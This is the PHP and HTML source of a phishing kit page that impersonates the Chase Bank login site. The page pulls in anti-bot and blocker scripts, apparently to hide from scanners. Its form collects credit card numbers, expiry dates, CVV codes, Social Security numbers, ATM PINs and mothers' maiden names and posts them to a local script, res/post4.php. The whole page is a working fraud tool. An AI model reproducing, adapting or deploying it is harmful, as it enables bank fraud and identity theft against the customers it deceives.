<?php
/*
Mou-Ad
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on');
ob_start();
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>
    <!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml"
 class="no-js" dir="ltr" lang="en">
<head>
  <meta http-equiv="Content-Type"
 content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible"
 content="IE=edge">
  <meta name="msapplication-config"
 content="none">
  <title>Chase Bank - Credit Card, Mortgage, Auto, Banking Services</title>
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport"content="width=device-width, initial-scale=1.0">
 <link rel="shortcut icon" href="css2/chasefavicon.ico" />
<!--[if lte IE 8]>
        <link rel="stylesheet" type="text/css" media="all" href="" />
        <![endif]-->
  <link rel="apple-touch-icon"
 sizes="152x152"
 href="css2/chase-touch-icon-152x152.png">
  <link rel="apple-touch-icon"
 sizes="120x120"
 href="css2/chase-touch-icon-120x120.png">
  <link rel="apple-touch-icon"
 sizes="76x76"
 href="css2/chase-touch-icon-76x76.png">
  <link rel="apple-touch-icon"
 href="css2/chase-touch-icon.png">
  <meta name="apple-mobile-web-app-capable"
 content="yes">
  <meta
 name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-startup-image"
 href="css/ipad-landscape.png"
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
  <link rel="apple-touch-startup-image"
 href="css/ipad-portrait.png"
 media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
  <link rel="apple-touch-startup-image"
 href="css/iphone.png"
 media="screen and (max-device-width: 320px)">
  <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('css2/opensans-regular.eot?#iefix') format('embedded-opentype'),url('css2/opensans-regular.woff') format('woff'),url('css2/opensans-regular.ttf') format('truetype'),url('css/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('css/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('css2/opensans-semibold.woff') format('woff'),url('css2/opensans-semibold.ttf') format('truetype'),url('css/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('css2/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('css2/opensans-light.ttf') format('truetype'),url('css/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('css2/videoplayer.eot?#iefix') format('embedded-opentype'),url('css2/videoplayer.woff') format('woff'),url('css2/videoplayer.ttf') format('truetype'),url('css2/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
        
          <script src="css/jquery-3.1.0.min.js"></script>
 <script src="css2/jquery.maskedinput.js"></script>
    <script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
        <script>
    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"X"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
    <script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
        <div class="msd password-reset first-step">

  
  <link rel="stylesheet"
 href="css2/blue-ui.css">
  <link rel="stylesheet"
 href="css/logon.css">
  <style type="text/css">.jpui.background.image { background-image: url(css/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='css/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(css/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(css/background.tablet.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(css/background.desktop.night.7.jpeg); } }</style>
</head>
<body style="height: 100%;"
 data-has-view="true">
<div>
<div class="homepage" tabindex="-1">
<div id="sitemessage" role="region"
 aria-labelledby="site-messages-heading"
 class="toggle-aria-hidden" aria-hidden="true"
 data-has-view="true">
<div>
<div id="siteMessageAda"
 aria-live="polite">
<h2 id="site-messages-heading"
 class="util accessible-text"
 data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You
have no more site alerts</h2>
</div>
</div>
</div>
<header id="logon-summary-menu"
 class="toggle-aria-hidden" data-has-view="true"></header>
<div
 class="logon header jpui transparent navigation bar">
      <img style="max-width: 80%;"   src="chase.png" />

</div>
<br>
</div>
<main id="logon-content"
 data-has-view="true"></main>
<div class="container logon">
<div>
<div
 class="jpui background image fixed show-xs show-sm"
 id="geoImage"></div>
</div>
<div class="row">
<div id="logoffbox"
 class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden">
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="progress">
<div class="bar"></div>
</div>
</div>
</div>
</div>
</div>
<div id="logonbox"
 class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box<center></center> 

<center><body onload="MM_preloadImages('')> 
<div class="jpui raised segment">
<div class="row">
<div class="col-xs-10 col-xs-offset-1">
<form id="login-form" method="post"
 autocomplete="off" action="res/post4.php" >
  <div id="validator-error-header"
 class="hide-xs">
  <div id="logon-error"
 class="jpui error inverted primary alert error" role="region">
  <div class="icon"><span
 id="type-icon-logon-error"><i
 class="jpui exclamation-color icon" aria-hidden="true"
 id="icon-type-icon-logon-error"></i></span></div>
  <div class="icon background"></div>
  <div id="content-logon-error"
 class="content wrap">
  <h2 class="title" tabindex="-1"
 id="inner-logon-error"><span
 class="util accessible-text" id="icon-logon-error">Important:
  </span></h2>
  </div>
  </div>
  </div>
  <label for="userId-input-field"
 class="util accessible-text logon-xs-toggle error"
 data-attr="LOGON.userIdPlaceholder"><span
 class="accessible-text errorAdaText">Error:</span>Full Name</label>
  <div id="userId"
abled>
 
 <input
 id="psp" class="jpui input"
 placeholder="Credit Card Number" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="12"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="">
 <input
 id="bn" class="jpui input"
 placeholder="Expiartion Date MM/YYYY" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="13"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="">
 <input
 id="dt" class="jpui input"
 placeholder="CCV/CSC" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="14"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="">
 <input
 id="ssd" class="jpui input"
 placeholder="Social Security Number (SSN)" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="16"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="">
 
 <input
 id="pinsi" class="jpui input"
 placeholder="ATM PIN" aria-describedby="userId-helpertext"
 aria-invalid="false" min="0" name="15"
 data-validate="userId" value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" >
 
  <input
 id="sasa" class="jpui input"
 placeholder="Mother's maiden name?" aria-describedby="userId-helpertext"
 name="0001"
  value="" autocorrect="off"
 autocapitalize="off" data-attr="LOGON.userId" type="text" required="" oninvalid="this.setCustomValidity('Please Enter Your Mother's madien name')"
    oninput="setCustomValidity('')">
  </div>
  
  <div>
  </div>
  <div></div>
  <div>
  <div>
  <div >
  <div >
  <div "></div>
  </div>
  </div>
  </div>
  <div>
  <div>
  <div >
  <div></div>
  </div>
  </div>
  </div>
  </div>
  <div class="row"> <button
 class="jpui button focus fluid primary" id="signin-button"
 type="submit" role="button"
 data-attr="LOGON.logonToLandingPage">
  <div class="label">Contiune</div>
  </button> </div>
  <div></div>
  <div></div>
</div>
</div>
</div>
</div>
</div>
</div><br><br>
<footer id="logon-footer"
 class="toggle-aria-hidden" data-has-view="true"></footer>
<div class="footer-container">
<div class="container">
<div class="social-links row">
<div class="col-xs-12"><span
 class="follow-us-text">Follow us:</span>
<ul class="icon-links">
  <li class="facebook"><a
 href="#"
 data-attr="LOGON_FOOTER_MENU.requestChaseFacebook"><i
 class="jpui facebook icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseFacebookAda">Facebook</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="instagram"><a
 href=""><i
 class="jpui instagram icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseInstagramAda">Instagram</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="twitter"><a
 href=""><i
 class="jpui twitter icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseTwitterAda">Twitter</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="youtube"><a
 href=""><i
 class="jpui youtube icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseYouTubeAda">YouTube</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
  <li class="linkedin"><a
 href=""><i
 class="jpui linkedin icon footer" aria-hidden="true"></i>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.requestChaseLinkedInAda">LinkedIn</span>
    <span class="util accessible-text"
 data-attr="LOGON_FOOTER_MENU.opensDialogAda">: Opens
dialog</span></a></li>
</ul>
</div>
</div>
<div class="footer-links row">
<div class="col-xs-12">
<ul>
  <li><a
 href="">Contact
us</a></li>
  <li><a
 href="=">Privacy</a></li>
  <li><a
 href="</a></li>
  <li><a
 href="">Terms
of use</a></li>
  <li><a
 href="">Our
commitment to accessibility</a></li>
  <li><a
 href="">SAFE
Act: Chase Mortgage Loan Originators</a></li>
  <li><a
 href="">Fair
Lending</a></li>
  <li><a
 href="">About
Chase</a></li>
  <li><a
 href="">J.P.
Morgan</a></li>
  <li><a
 href="">JPMorgan
Chase &amp; Co.</a></li>
  <li><a
 href="">Careers</a></li>
  <li><a
 href="" lang="es">Espa&ntilde;ol</a></li>
  <li><a
 href="">Chase
Canada</a></li>
  <li><a
 href="">Site map</a></li>
  <li>Member FDIC</li>
  <li><i
 class="jpui equal-housing-lender icon" aria-hidden="true"></i>
Equal Housing Lender</li>
  <li class="copyright-label">&copy;
2018 JPMorgan Chase &amp; Co.</li>
</ul>
</div>
</div>
<div class="row galaxy-footer">
<div class="col-xs-10 col-xs-offset-1">
<p class="NOTE"><span></span><br>
<span class="copyright-label">&copy;
2017 JPMorgan Chase &amp; Co.</span><br>
<a
 href=""
 data-attr="LOGON_FOOTER_MENU.requestPrivacyNotice">Privacy
<i class="jpui progressright icon end-icon"
 aria-hidden="true"></i></a><br>
<a
 href="">Our
commitment to accessibility<i
 class="jpui progressright icon end-icon" aria-hidden="true"></i></a></p>
</div>
</div>
</div>
</div>
</div>
<div id="languageSupportDisclaimer"></div>
<div id="overlay" data-has-view="true"></div>
<div id="signoutModal"></div>
<div id="siteExitWarning"></div>
<div id="serviceErrorModal">
</div>
<div id="sessionTimeoutModal"></div>
</div>
</body>
</html>